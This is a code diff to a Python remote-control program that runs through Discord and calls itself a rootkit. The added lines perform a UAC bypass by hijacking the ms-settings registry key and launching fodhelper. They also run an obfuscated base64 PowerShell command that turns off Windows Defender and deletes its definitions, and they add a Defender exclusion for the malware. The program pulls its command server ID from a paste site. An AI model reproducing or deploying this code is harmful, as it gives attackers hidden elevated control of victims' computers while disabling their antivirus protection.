@@ -1,4 +1,4 @@
-import os, tempfile
+import os, tempfile, sys
 TEMP = tempfile.gettempdir()
 APPDATA = os.getenv('APPDATA')
 try:
@@ -19,6 +19,7 @@ try:
     from datetime import datetime, timedelta
     import base64
     from discord.ext import commands
+    import ctypes
 except ModuleNotFoundError:
     libs = [
         'requests',
@@ -35,6 +36,7 @@ except ModuleNotFoundError:
     import discord
     import asyncio
     import pyautogui
+    import ctypes
     import zipfile
     import random
     import string
@@ -48,6 +50,37 @@ except ModuleNotFoundError:
     import base64
     from discord.ext import commands
 os.environ['SSL_CERT_FILE'] = certifi.where()
+
+def adm() -> bool:
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() == 1
+    except:
+        return False
+
+# from https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Components/stub.py (TEMPORARY) (EDITED) (DETECTED ASF)
+if not adm():
+    execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+    execute("computerdefaults --nouacbypass")
+    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+    execute("fodhelper --nouacbypass")
+    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+
+
+
+
+# from https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Components/stub.py (TEMPORARY)
+command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
+subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+
+subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(sys.executable), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+
+
+
+
 prefix = '>'
 serverid = requests.get('https://rentry.co/75xvys3e/raw').text.strip()
 serverid = int(serverid)
@@ -71,6 +104,16 @@ txts = {}
 vcs = {}
 
 class utils:
+    def runningasadmin() -> bool:
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() == 1
+        except:
+            return False
+    
+    # from https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Components/stub.py (TEMPORARY)
+    def promptadmin(path: str) -> bool:
+        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42
+
     def zip(path, ziph):
         for root, dirs, files in os.walk(path):
             for file in files:
@@ -550,11 +593,14 @@ class getinfo:
                     except:
                         pass
 
+
 client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
 
 @client.event
 async def on_ready():
     global hwid
+    activity = discord.Activity(type=discord.ActivityType.watching, name=f'R3CI/discord-rootkit | running on {os.getlogin()}')
+    await client.change_presence(activity=activity)
     first_run = True
     hwid = subprocess.check_output('powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID').decode().strip()
     guild = client.get_guild(serverid)
